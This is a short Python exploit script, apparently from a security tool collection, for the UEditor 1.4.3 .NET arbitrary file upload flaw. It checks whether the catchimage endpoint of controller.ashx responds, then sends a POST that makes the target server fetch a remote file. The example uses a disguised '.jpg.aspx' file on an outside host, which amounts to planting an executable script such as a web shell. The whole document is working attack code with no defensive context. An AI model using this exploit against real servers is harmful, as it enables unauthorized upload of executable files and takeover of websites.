#!/usr/bin/env python
# author:Xiaogang
# Help: Ueditor 1.4.3 net版本任意文件上传漏洞

import requests
import sys

def verify(url):
  target = "{}/net/controller.ashx?action=catchimage".format(url)
  headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:49.0) Gecko/20100101 Firefox/49.0'
  }
  payload={}
  response = requests.request("GET", target, headers=headers, data=payload)
  if response:
  	data = response.text
  	if "state" in data:
  		print("应该可以利用{}".format(data))
  	else:
  		print("应该无法利用")

def attack(url,des):

  target = "{}/net/controller.ashx?action=catchimage".format(url)
  post_data='source[]={}'.format(des)
  headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:49.0) Gecko/20100101 Firefox/49.0',
    'Content-Type': 'application/x-www-form-urlencoded'
  }

  try:
    response = requests.request("POST", target, headers=headers, data=post_data)
    if response:
      data = response.text
      if "upload" in data:
        print("成功{}".format(data))
      else:
        print("失败{}".format(data))
    else:
      print(response)
  except Exception as e:
    print("发生错误{}".format(e))


def main():
  args = sys.argv
  url = ""

  if len(args) == 5:
    url = args[2]
    des = args[4]
    attack(url,des)
  elif len(args) == 3:
    url = args[2]
    verify(url)
  else:
    print("Usage: python {} {} url地址 [{} {}]".format(args[0],"-u","-d","上传文件地址"))
    print("Usage: python {} -u http://192.168.1.1/Ueditor/ -d http://1.1.1.1/123.jpg.aspx")


if __name__ == '__main__':
  main()